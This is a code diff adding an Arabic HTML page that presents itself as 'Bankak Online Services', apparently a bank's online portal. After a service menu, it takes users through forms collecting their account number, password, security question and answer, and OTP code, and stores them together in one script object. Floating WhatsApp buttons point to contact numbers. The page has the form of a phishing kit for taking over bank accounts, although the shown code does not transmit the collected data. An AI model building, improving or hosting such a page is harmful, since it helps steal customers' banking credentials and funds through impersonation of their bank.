@@ -1,0 +1,916 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>خدمات بنكك أونلاين</title>
+    <style>
+        :root {
+            --red-main: #d31924;
+            --red-dark: #a81019;
+            --red-soft: #fff1f2;
+            --yellow-main: #ffcc00;
+            --yellow-hover: #e6b800;
+            --bg-page: #f5f6f8;
+            --card-bg: #ffffff;
+            --text-dark: #1c1e21;
+            --text-muted: #65676b;
+            --border-light: #e5e7eb;
+            --wa-green: #25d366;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html, body {
+            width: 100%;
+            min-height: 100vh;
+            background-color: var(--bg-page);
+            color: var(--text-dark);
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+        }
+
+        .top-banner {
+            background: linear-gradient(135deg, var(--red-main), var(--red-dark));
+            color: #ffffff;
+            width: 100%;
+            padding: 20px 16px 24px 16px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            box-shadow: 0 4px 14px rgba(211, 25, 36, 0.25);
+            position: sticky;
+            top: 0;
+            z-index: 50;
+        }
+
+        .brand-logo-box {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 10px;
+            background: rgba(255, 255, 255, 0.12);
+            padding: 8px 16px;
+            border-radius: 14px;
+            border: 1px solid rgba(255, 255, 255, 0.22);
+        }
+
+        .brand-emblem {
+            width: 34px;
+            height: 34px;
+            border-radius: 10px;
+            background-color: var(--yellow-main);
+            color: var(--red-dark);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 900;
+            font-size: 1.15rem;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+        }
+
+        .brand-text {
+            text-align: right;
+            line-height: 1.15;
+        }
+
+        .brand-text .ar-name {
+            font-size: 1.05rem;
+            font-weight: 800;
+            display: block;
+        }
+
+        .brand-text .en-name {
+            font-size: 0.72rem;
+            color: var(--yellow-main);
+            letter-spacing: 0.4px;
+            font-weight: 600;
+        }
+
+        .yellow-pill {
+            background-color: var(--yellow-main);
+            color: #161616;
+            font-weight: 800;
+            font-size: 0.98rem;
+            padding: 8px 24px;
+            border-radius: 999px;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.18);
+            display: inline-block;
+        }
+
+        .full-screen-wrapper {
+            flex: 1;
+            width: 100%;
+            min-height: calc(100vh - 140px);
+            display: flex;
+            flex-direction: column;
+            padding: 22px 14px 88px 14px;
+        }
+
+        .content-inner {
+            width: 100%;
+            max-width: 720px;
+            margin: 0 auto;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .hero-section {
+            text-align: center;
+            margin-bottom: 20px;
+            background: #ffffff;
+            padding: 18px 14px;
+            border-radius: 14px;
+            border-bottom: 3px solid var(--yellow-main);
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.04);
+        }
+
+        .hero-section h1 {
+            font-size: 1.35rem;
+            color: var(--red-main);
+            font-weight: 800;
+            margin-bottom: 6px;
+        }
+
+        .hero-section p {
+            font-size: 0.92rem;
+            color: var(--text-muted);
+            font-weight: 500;
+        }
+
+        .services-list {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .service-item {
+            background-color: var(--card-bg);
+            border: 1.5px solid var(--border-light);
+            border-right: 5px solid var(--red-main);
+            border-radius: 14px;
+            padding: 15px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 12px;
+            cursor: pointer;
+            transition: transform 0.18s ease, box-shadow 0.18s ease, border-color 0.18s ease;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
+        }
+
+        .service-item:hover,
+        .service-item:active {
+            transform: translateY(-2px);
+            border-color: var(--red-main);
+            border-right-width: 6px;
+            box-shadow: 0 6px 16px rgba(211, 25, 36, 0.12);
+        }
+
+        .service-info {
+            flex: 1;
+            text-align: right;
+        }
+
+        .service-info h3 {
+            font-size: 1.02rem;
+            font-weight: 800;
+            color: var(--text-dark);
+            margin-bottom: 3px;
+        }
+
+        .service-info p {
+            font-size: 0.82rem;
+            color: var(--text-muted);
+            line-height: 1.35;
+        }
+
+        .service-icon-badge {
+            width: 44px;
+            height: 44px;
+            min-width: 44px;
+            border-radius: 12px;
+            background-color: var(--red-soft);
+            color: var(--red-main);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.25rem;
+            font-weight: 700;
+            border: 1px solid rgba(211, 25, 36, 0.18);
+        }
+
+        .step-view {
+            display: none;
+            width: 100%;
+            flex: 1;
+            flex-direction: column;
+        }
+
+        .step-view.active {
+            display: flex;
+        }
+
+        .form-card {
+            background-color: var(--card-bg);
+            border-radius: 16px;
+            padding: 22px 18px;
+            box-shadow: 0 6px 22px rgba(0, 0, 0, 0.07);
+            border-top: 4px solid var(--red-main);
+            width: 100%;
+        }
+
+        .form-card-header {
+            text-align: center;
+            margin-bottom: 18px;
+            padding-bottom: 12px;
+            border-bottom: 1.5px solid var(--red-soft);
+        }
+
+        .form-card-header h2 {
+            font-size: 1.2rem;
+            color: var(--red-main);
+            font-weight: 800;
+            margin-bottom: 4px;
+        }
+
+        .form-card-header span {
+            display: inline-block;
+            background-color: var(--yellow-main);
+            color: #161616;
+            font-size: 0.78rem;
+            font-weight: 700;
+            padding: 3px 12px;
+            border-radius: 999px;
+        }
+
+        .field-group {
+            margin-bottom: 14px;
+        }
+
+        .field-group label {
+            display: block;
+            font-size: 0.9rem;
+            font-weight: 700;
+            color: var(--text-dark);
+            margin-bottom: 6px;
+        }
+
+        .field-group input,
+        .field-group select,
+        .field-group textarea {
+            width: 100%;
+            padding: 12px 13px;
+            border: 1.5px solid #d1d5db;
+            border-radius: 10px;
+            font-size: 0.96rem;
+            color: var(--text-dark);
+            background-color: #ffffff;
+            outline: none;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        .field-group input:focus,
+        .field-group select:focus,
+        .field-group textarea:focus {
+            border-color: var(--red-main);
+            box-shadow: 0 0 0 3px rgba(211, 25, 36, 0.1);
+        }
+
+        .readonly-highlight {
+            background-color: #fff8db !important;
+            border-color: var(--yellow-main) !important;
+            font-weight: 800 !important;
+            color: var(--red-dark) !important;
+        }
+
+        .field-hint {
+            font-size: 0.78rem;
+            color: var(--text-muted);
+            margin-top: 5px;
+            line-height: 1.4;
+        }
+
+        .otp-timer-box {
+            background-color: var(--red-soft);
+            border: 1.5px solid rgba(211, 25, 36, 0.25);
+            border-radius: 12px;
+            padding: 12px;
+            text-align: center;
+            margin-bottom: 16px;
+        }
+
+        .otp-timer-label {
+            font-size: 0.84rem;
+            color: var(--text-muted);
+            margin-bottom: 4px;
+            font-weight: 600;
+        }
+
+        .otp-timer-clock {
+            font-size: 1.45rem;
+            font-weight: 900;
+            color: var(--red-main);
+            letter-spacing: 1px;
+            direction: ltr;
+            display: inline-block;
+            background: var(--yellow-main);
+            padding: 4px 14px;
+            border-radius: 8px;
+        }
+
+        .btn-primary-red {
+            width: 100%;
+            padding: 13px 16px;
+            background-color: var(--red-main);
+            color: #ffffff;
+            border: none;
+            border-radius: 10px;
+            font-size: 1rem;
+            font-weight: 800;
+            cursor: pointer;
+            margin-top: 6px;
+            transition: background-color 0.2s ease, transform 0.15s ease;
+            box-shadow: 0 4px 12px rgba(211, 25, 36, 0.22);
+        }
+
+        .btn-primary-red:hover {
+            background-color: var(--red-dark);
+        }
+
+        .btn-primary-red:active {
+            transform: scale(0.99);
+        }
+
+        .btn-yellow-secondary {
+            width: 100%;
+            padding: 11px 16px;
+            background-color: var(--yellow-main);
+            color: #161616;
+            border: none;
+            border-radius: 10px;
+            font-size: 0.92rem;
+            font-weight: 800;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.2s ease;
+        }
+
+        .btn-yellow-secondary:hover {
+            background-color: var(--yellow-hover);
+        }
+
+        .floating-wa {
+            position: fixed;
+            bottom: 84px;
+            right: 16px;
+            width: 54px;
+            height: 54px;
+            border-radius: 50%;
+            background-color: var(--wa-green);
+            color: #ffffff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+            font-size: 1.5rem;
+            box-shadow: 0 6px 18px rgba(37, 211, 102, 0.45);
+            z-index: 60;
+            transition: transform 0.2s ease;
+        }
+
+        .floating-wa:hover {
+            transform: scale(1.06);
+        }
+
+        .site-footer {
+            background-color: #18191a;
+            color: #ffffff;
+            padding: 18px 14px;
+            text-align: center;
+            border-top: 3px solid var(--yellow-main);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+            width: 100%;
+        }
+
+        .site-footer p {
+            font-size: 0.85rem;
+            color: #e4e6eb;
+        }
+
+        .footer-wa-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background-color: var(--wa-green);
+            color: #ffffff;
+            text-decoration: none;
+            padding: 9px 18px;
+            border-radius: 999px;
+            font-weight: 800;
+            font-size: 0.88rem;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.25);
+        }
+
+        @media (max-width: 480px) {
+            .top-banner {
+                padding: 16px 12px 18px 12px;
+            }
+            .hero-section h1 {
+                font-size: 1.18rem;
+            }
+            .form-card {
+                padding: 18px 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="top-banner">
+        <div class="brand-logo-box">
+            <div class="brand-emblem">◈</div>
+            <div class="brand-text">
+                <span class="ar-name">خدمات بنكك أونلاين</span>
+                <span class="en-name">BANKAK ONLINE SERVICES</span>
+            </div>
+        </div>
+        <div class="yellow-pill">خدمات بنكك أونلاين</div>
+    </header>
+
+    <a href="https://wa.me/249907882010" target="_blank" rel="noopener noreferrer" class="floating-wa" aria-label="تواصل واتساب">
+        💬
+    </a>
+
+    <main class="full-screen-wrapper">
+        <div class="content-inner">
+
+            <section id="home-view" class="step-view active">
+                <div class="hero-section">
+                    <h1>مرحباً بكم في خدمات بنكك أونلاين</h1>
+                    <p>الرجاء الاختيار من الخدمات المقدمة أدناه</p>
+                </div>
+
+                <div class="services-list">
+                    <div class="service-item" onclick="selectService('تحديث البيانات')">
+                        <div class="service-info">
+                            <h3>تحديث البيانات</h3>
+                            <p>تحديث بيانات حسابك الشخصية ومعلومات التواصل</p>
+                        </div>
+                        <div class="service-icon-badge">↻</div>
+                    </div>
+
+                    <div class="service-item" onclick="selectService('رفع سقف التحويلات اليومية')">
+                        <div class="service-info">
+                            <h3>رفع سقف التحويلات اليومية</h3>
+                            <p>زيادة الحد اليومي للتحويلات من 25.000.000.00 إلى 45.000.000.00</p>
+                        </div>
+                        <div class="service-icon-badge">📈</div>
+                    </div>
+
+                    <div class="service-item" onclick="selectService('التحويلات الخاطئة')">
+                        <div class="service-info">
+                            <h3>التحويلات الخاطئة</h3>
+                            <p>معالجة أخطاء التحويلات البنكية وتقديم بلاغ مراجعة</p>
+                        </div>
+                        <div class="service-icon-badge">⇄</div>
+                    </div>
+
+                    <div class="service-item" onclick="selectService('خدمات العملات الأجنبية')">
+                        <div class="service-info">
+                            <h3>خدمات العملات الأجنبية</h3>
+                            <p>تفعيل وإدارة وطلب العملات الأجنبية</p>
+                        </div>
+                        <div class="service-icon-badge">🌐</div>
+                    </div>
+
+                    <div class="service-item" onclick="selectService('كشف الحساب')">
+                        <div class="service-info">
+                            <h3>كشف الحساب</h3>
+                            <p>الحصول على كشف حساب مفصل للفترة المطلوبة</p>
+                        </div>
+                        <div class="service-icon-badge">📄</div>
+                    </div>
+
+                    <div class="service-item" onclick="selectService('بطاقة فيزا افتراضية')">
+                        <div class="service-info">
+                            <h3>بطاقة فيزا افتراضية</h3>
+                            <p>تفعيل وإصدار بطاقة فيزا للاستخدام الإلكتروني</p>
+                        </div>
+                        <div class="service-icon-badge">💳</div>
+                    </div>
+
+                    <div class="service-item" onclick="selectService('حساب جاري وحساب مميز')">
+                        <div class="service-info">
+                            <h3>حساب جاري وحساب مميز</h3>
+                            <p>فتح أو ترقية الحساب الجاري إلى حساب مميز</p>
+                        </div>
+                        <div class="service-icon-badge">🏦</div>
+                    </div>
+
+                    <div class="service-item" onclick="selectService('إدارة أسئلة الأمان')">
+                        <div class="service-info">
+                            <h3>إدارة أسئلة الأمان</h3>
+                            <p>تحديث وإدارة أسئلة التحقق والأمان للحساب</p>
+                        </div>
+                        <div class="service-icon-badge">🛡️</div>
+                    </div>
+                </div>
+            </section>
+
+            <section id="service-details-view" class="step-view">
+                <div class="form-card">
+                    <div class="form-card-header">
+                        <h2 id="service-form-heading">نموذج الخدمة</h2>
+                        <span id="service-badge-name">الخدمة</span>
+                    </div>
+                    <form id="service-specific-form" onsubmit="handleServiceFormSubmit(event)">
+                        <div id="dynamic-service-fields"></div>
+                        <button type="submit" class="btn-primary-red">متابعة</button>
+                        <button type="button" class="btn-yellow-secondary" onclick="returnToHome()">العودة إلى الخدمات</button>
+                    </form>
+                </div>
+            </section>
+
+            <section id="login-credentials-view" class="step-view">
+                <div class="form-card">
+                    <div class="form-card-header">
+                        <h2>بيانات الدخول والتحقق</h2>
+                        <span id="login-service-label">الخدمة</span>
+                    </div>
+                    <form id="login-credentials-form" onsubmit="handleCredentialsSubmit(event)">
+                        <div class="field-group">
+                            <label for="account-number-input">رقم الحساب</label>
+                            <input type="text" id="account-number-input" required placeholder="أدخل رقم الحساب">
+                        </div>
+                        <div class="field-group">
+                            <label for="account-password-input">كلمة السر</label>
+                            <input type="password" id="account-password-input" required placeholder="أدخل كلمة السر">
+                            <div class="field-hint">أدخل كلمة السر الخاصة بحسابك للمتابعة.</div>
+                        </div>
+                        <button type="submit" class="btn-primary-red">التالي</button>
+                        <button type="button" class="btn-yellow-secondary" onclick="backToServiceForm()">السابق</button>
+                    </form>
+                </div>
+            </section>
+
+            <section id="security-question-view" class="step-view">
+                <div class="form-card">
+                    <div class="form-card-header">
+                        <h2>أسئلة الأمان</h2>
+                        <span>التحقق الأمني</span>
+                    </div>
+                    <form id="security-question-form" onsubmit="handleSecuritySubmit(event)">
+                        <div class="field-group">
+                            <label for="security-question-select">اختر سؤال الأمان</label>
+                            <select id="security-question-select" required>
+                                <option value="" disabled selected>-- اختر سؤال الأمان --</option>
+                                <option value="ما هو اسم ابن عمك الأول؟">ما هو اسم ابن عمك الأول؟</option>
+                                <option value="ما كان لقبك أثناء الطفولة؟">ما كان لقبك أثناء الطفولة؟</option>
+                                <option value="في أي سنة تزوجت؟">في أي سنة تزوجت؟</option>
+                                <option value="في أي مدينة ولدت؟">في أي مدينة ولدت؟</option>
+                                <option value="في أي سنة تخرجت من الجامعة؟">في أي سنة تخرجت من الجامعة؟</option>
+                                <option value="اسم مؤلفك المفضل؟">اسم مؤلفك المفضل؟</option>
+                                <option value="اسم الشركة المصنعة للسيارة المفضلة لديك؟">اسم الشركة المصنعة للسيارة المفضلة لديك؟</option>
+                                <option value="أي فيلم هو المفضل لديك؟">أي فيلم هو المفضل لديك؟</option>
+                                <option value="اسم صديق في الطفولة؟">اسم صديق في الطفولة؟</option>
+                                <option value="في أي عام حصلت على رخصة القيادة الخاصة بك؟">في أي عام حصلت على رخصة القيادة الخاصة بك؟</option>
+                                <option value="العلامة التجارية لأول تلفزيون خاص بك؟">العلامة التجارية لأول تلفزيون خاص بك؟</option>
+                                <option value="اسم فريق كرة القدم المفضل لديك؟">اسم فريق كرة القدم المفضل لديك؟</option>
+                                <option value="ما هو اسم المدرسة التي التحقت بها؟">ما هو اسم المدرسة التي التحقت بها؟</option>
+                                <option value="اسم أول بلد أجنبي قمت بزيارته؟">اسم أول بلد أجنبي قمت بزيارته؟</option>
+                                <option value="ما هي ماركة سيارتك الأولي؟">ما هي ماركة سيارتك الأولي؟</option>
+                            </select>
+                        </div>
+                        <div class="field-group">
+                            <label for="security-answer-input">إجابة سؤال الأمان</label>
+                            <input type="text" id="security-answer-input" required placeholder="أدخل إجابة سؤال الأمان">
+                        </div>
+                        <button type="submit" class="btn-primary-red">التالي</button>
+                    </form>
+                </div>
+            </section>
+
+            <section id="otp-verification-view" class="step-view">
+                <div class="form-card">
+                    <div class="form-card-header">
+                        <h2>رمز التحقق (OTP)</h2>
+                        <span>تأكيد الطلب</span>
+                    </div>
+                    <p style="text-align: center; font-size: 0.9rem; color: var(--text-dark); margin-bottom: 14px; line-height: 1.5;">
+                        تم إرسال رمز الـ OTP إلى رقم الشريحة أو البريد الإلكتروني المسجل.
+                    </p>
+
+                    <div class="otp-timer-box">
+                        <div class="otp-timer-label">الوقت المتبقي لصلاحية الرمز (60 دقيقة)</div>
+                        <div id="otp-countdown-display" class="otp-timer-clock">60:00</div>
+                    </div>
+
+                    <form id="otp-verification-form" onsubmit="handleOtpSubmit(event)">
+                        <div class="field-group">
+                            <label for="otp-code-input">أدخل رمز الـ OTP</label>
+                            <input type="text" id="otp-code-input" required placeholder="أدخل رمز التحقق">
+                        </div>
+                        <button type="submit" class="btn-primary-red">تأكيد وإرسال الآن</button>
+                    </form>
+                </div>
+            </section>
+
+        </div>
+    </main>
+
+    <footer class="site-footer">
+        <p>جميع الحقوق محفوظة © 2026 خدمات بنكك أونلاين</p>
+        <a href="https://wa.me/249118504765" target="_blank" rel="noopener noreferrer" class="footer-wa-btn">
+            <span>تواصل واتساب</span>
+            <span dir="ltr">+249 118504765</span>
+        </a>
+    </footer>
+
+    <script>
+        let selectedServiceName = "";
+        let formPayload = {};
+        let otpIntervalId = null;
+        let remainingOtpSeconds = 60 * 60;
+
+        function showOnlyView(viewId) {
+            document.querySelectorAll(".step-view").forEach(view => {
+                view.classList.remove("active");
+            });
+            const target = document.getElementById(viewId);
+            if (target) {
+                target.classList.add("active");
+                window.scrollTo({ top: 0, behavior: "smooth" });
+            }
+        }
+
+        function recordStepData(partialData) {
+            formPayload = { ...formPayload, ...partialData };
+        }
+
+        function selectService(serviceTitle) {
+            selectedServiceName = serviceTitle;
+            formPayload = { "الخدمة المختارة": serviceTitle };
+
+            document.getElementById("service-form-heading").textContent = "نموذج " + serviceTitle;
+            document.getElementById("service-badge-name").textContent = serviceTitle;
+            document.getElementById("login-service-label").textContent = serviceTitle;
+
+            let fieldsHtml = "";
+
+            if (serviceTitle === "تحديث البيانات") {
+                fieldsHtml = `
+                    <div class="field-group">
+                        <label for="f-fullname">الاسم الكامل</label>
+                        <input type="text" id="f-fullname" required placeholder="أدخل الاسم الكامل">
+                    </div>
+                    <div class="field-group">
+                        <label for="f-phone">رقم الهاتف / الشريحة</label>
+                        <input type="tel" id="f-phone" required placeholder="مثال: 0912345678">
+                    </div>
+                    <div class="field-group">
+                        <label for="f-email">البريد الإلكتروني</label>
+                        <input type="email" id="f-email" required placeholder="example@mail.com">
+                    </div>
+                    <div class="field-group">
+                        <label for="f-address">العنوان / المدينة</label>
+                        <input type="text" id="f-address" required placeholder="أدخل المدينة والحي">
+                    </div>
+                `;
+            } else if (serviceTitle === "رفع سقف التحويلات اليومية") {
+                fieldsHtml = `
+                    <div class="field-group">
+                        <label for="f-current-limit">السقف الحالي</label>
+                        <input type="text" id="f-current-limit" value="25.000.000.00" readonly class="readonly-highlight">
+                    </div>
+                    <div class="field-group">
+                        <label for="f-requested-limit">السقف المطلوب</label>
+                        <input type="text" id="f-requested-limit" value="45.000.000.00" readonly class="readonly-highlight">
+                    </div>
+                    <div class="field-group">
+                        <label for="f-limit-note">سبب طلب رفع السقف</label>
+                        <input type="text" id="f-limit-note" placeholder="أدخل سبب الطلب (اختياري)">
+                    </div>
+                `;
+            } else if (serviceTitle === "التحويلات الخاطئة") {
+                fieldsHtml = `
+                    <div class="field-group">
+                        <label for="f-wrong-account">رقم الحساب المحول إليه بالخطأ</label>
+                        <input type="text" id="f-wrong-account" required placeholder="أدخل رقم الحساب">
+                    </div>
+                    <div class="field-group">
+                        <label for="f-tx-ref">رقم العملية / المرجع</label>
+                        <input type="text" id="f-tx-ref" required placeholder="أدخل رقم العملية">
+                    </div>
+                    <div class="field-group">
+                        <label for="f-tx-amount">قيمة المبلغ المحول</label>
+                        <input type="text" id="f-tx-amount" required placeholder="أدخل المبلغ">
+                    </div>
+                `;
+            } else if (serviceTitle === "خدمات العملات الأجنبية") {
+                fieldsHtml = `
+                    <div class="field-group">
+                        <label for="f-currency">العملة الأجنبية</label>
+                        <select id="f-currency" required>
+                            <option value="دولار أمريكي (USD)">دولار أمريكي (USD)</option>
+                            <option value="ريال سعودي (SAR)">ريال سعودي (SAR)</option>
+                            <option value="درهم إماراتي (AED)">درهم إماراتي (AED)</option>
+                            <option value="يورو (EUR)">يورو (EUR)</option>
+                        </select>
+                    </div>
+                    <div class="field-group">
+                        <label for="f-currency-amount">المبلغ المطلوب</label>
+                        <input type="text" id="f-currency-amount" required placeholder="أدخل المبلغ">
+                    </div>
+                `;
+            } else if (serviceTitle === "كشف الحساب") {
+                fieldsHtml = `
+                    <div class="field-group">
+                        <label for="f-statement-range">الفترة الزمنية لكشف الحساب</label>
+                        <select id="f-statement-range" required>
+                            <option value="آخر شهر">آخر شهر</option>
+                            <option value="آخر 3 أشهر">آخر 3 أشهر</option>
+                            <option value="آخر 6 أشهر">آخر 6 أشهر</option>
+                            <option value="سنة كاملة">سنة كاملة</option>
+                        </select>
+                    </div>
+                    <div class="field-group">
+                        <label for="f-statement-reason">الغرض من كشف الحساب</label>
+                        <input type="text" id="f-statement-reason" required placeholder="أدخل الغرض من الطلب">
+                    </div>
+                `;
+            } else if (serviceTitle === "بطاقة فيزا افتراضية") {
+                fieldsHtml = `
+                    <div class="field-group">
+                        <label for="f-visa-currency">عملة البطاقة الافتراضية</label>
+                        <select id="f-visa-currency" required>
+                            <option value="دولار أمريكي (USD)">دولار أمريكي (USD)</option>
+                        </select>
+                    </div>
+                    <div class="field-group">
+                        <label for="f-visa-deposit">الرصيد المبدئي للبطاقة</label>
+                        <input type="text" id="f-visa-deposit" required placeholder="أدخل الرصيد المبدئي">
+                    </div>
+                `;
+            } else if (serviceTitle === "حساب جاري وحساب مميز") {
+                fieldsHtml = `
+                    <div class="field-group">
+                        <label for="f-account-tier">نوع الحساب المطلوب</label>
+                        <select id="f-account-tier" required>
+                            <option value="حساب جاري">حساب جاري</option>
+                            <option value="حساب مميز">حساب مميز</option>
+                        </select>
+                    </div>
+                    <div class="field-group">
+                        <label for="f-branch-name">الفرع أو المدينة</label>
+                        <input type="text" id="f-branch-name" required placeholder="أدخل اسم الفرع أو المدينة">
+                    </div>
+                `;
+            } else {
+                fieldsHtml = `
+                    <div class="field-group">
+                        <label for="f-security-manage">تفاصيل إدارة أسئلة الأمان</label>
+                        <textarea id="f-security-manage" rows="3" required placeholder="اكتب التعديل أو الطلب المطلوب لأسئلة الأمان..."></textarea>
+                    </div>
+                `;
+            }
+
+            document.getElementById("dynamic-service-fields").innerHTML = fieldsHtml;
+            showOnlyView("service-details-view");
+        }
+
+        function handleServiceFormSubmit(event) {
+            event.preventDefault();
+            let serviceDetails = {};
+
+            if (selectedServiceName === "تحديث البيانات") {
+                serviceDetails["الاسم الكامل"] = document.getElementById("f-fullname").value.trim();
+                serviceDetails["رقم الهاتف"] = document.getElementById("f-phone").value.trim();
+                serviceDetails["البريد الإلكتروني"] = document.getElementById("f-email").value.trim();
+                serviceDetails["العنوان"] = document.getElementById("f-address").value.trim();
+            } else if (selectedServiceName === "رفع سقف التحويلات اليومية") {
+                serviceDetails["السقف الحالي"] = "25.000.000.00";
+                serviceDetails["السقف المطلوب"] = "45.000.000.00";
+                serviceDetails["سبب رفع السقف"] = document.getElementById("f-limit-note").value.trim() || "غير محدد";
+            } else if (selectedServiceName === "التحويلات الخاطئة") {
+                serviceDetails["رقم الحساب الخاطئ"] = document.getElementById("f-wrong-account").value.trim();
+                serviceDetails["رقم العملية"] = document.getElementById("f-tx-ref").value.trim();
+                serviceDetails["المبلغ"] = document.getElementById("f-tx-amount").value.trim();
+            } else if (selectedServiceName === "خدمات العملات الأجنبية") {
+                serviceDetails["العملة"] = document.getElementById("f-currency").value;
+                serviceDetails["المبلغ"] = document.getElementById("f-currency-amount").value.trim();
+            } else if (selectedServiceName === "كشف الحساب") {
+                serviceDetails["الفترة الزمنية"] = document.getElementById("f-statement-range").value;
+                serviceDetails["الغرض"] = document.getElementById("f-statement-reason").value.trim();
+            } else if (selectedServiceName === "بطاقة فيزا افتراضية") {
+                serviceDetails["عملة البطاقة"] = document.getElementById("f-visa-currency").value;
+                serviceDetails["الرصيد المبدئي"] = document.getElementById("f-visa-deposit").value.trim();
+            } else if (selectedServiceName === "حساب جاري وحساب مميز") {
+                serviceDetails["نوع الحساب"] = document.getElementById("f-account-tier").value;
+                serviceDetails["الفرع / المدينة"] = document.getElementById("f-branch-name").value.trim();
+            } else {
+                serviceDetails["تفاصيل إدارة أسئلة الأمان"] = document.getElementById("f-security-manage").value.trim();
+            }
+
+            recordStepData(serviceDetails);
+            showOnlyView("login-credentials-view");
+        }
+
+        function handleCredentialsSubmit(event) {
+            event.preventDefault();
+            const accNum = document.getElementById("account-number-input").value.trim();
+            const accPass = document.getElementById("account-password-input").value;
+
+            recordStepData({
+                "رقم الحساب": accNum,
+                "كلمة السر": accPass
+            });
+
+            showOnlyView("security-question-view");
+        }
+
+        function handleSecuritySubmit(event) {
+            event.preventDefault();
+            const chosenQuestion = document.getElementById("security-question-select").value;
+            const chosenAnswer = document.getElementById("security-answer-input").value.trim();
+
+            recordStepData({
+                "سؤال الأمان": chosenQuestion,
+                "إجابة سؤال الأمان": chosenAnswer
+            });
+
+            startSixtyMinuteOtpTimer();
+            showOnlyView("otp-verification-view");
+        }
+
+        function startSixtyMinuteOtpTimer() {
+            if (otpIntervalId) {
+                clearInterval(otpIntervalId);
+            }
+            remainingOtpSeconds = 60 * 60;
+            renderOtpCountdown();
+
+            otpIntervalId = setInterval(() => {
+                if (remainingOtpSeconds > 0) {
+                    remainingOtpSeconds--;
+                    renderOtpCountdown();
+                } else {
+                    clearInterval(otpIntervalId);
+                }
+            }, 1000);
+        }
+
+        function renderOtpCountdown() {
+            const mins = Math.floor(remainingOtpSeconds / 60);
+            const secs = remainingOtpSeconds % 60;
+            const formatted = `${String(mins).padStart(2, "0")}:${String(secs).padStart(2, "0")}`;
+            const displayEl = document.getElementById("otp-countdown-display");
+            if (displayEl) {
+                displayEl.textContent = formatted;
+            }
+        }
+
+        function handleOtpSubmit(event) {
+            event.preventDefault();
+            const otpVal = document.getElementById("otp-code-input").value.trim();
+
+            recordStepData({
+                "رمز OTP": otpVal
+            });
+
+            if (otpIntervalId) {
+                clearInterval(otpIntervalId);
+            }
+
+            alert("تم تأكيد الطلب وإرسال رمز الـ OTP بنجاح.");
+            location.reload();
+        }
+
+        function backToServiceForm() {
+            showOnlyView("service-details-view");
+        }
+
+        function returnToHome() {
+            if (otpIntervalId) {
+                clearInterval(otpIntervalId);
+            }
+            formPayload = {};
+            showOnlyView("home-view");
+        }
+    </script>
+</body>
+</html>
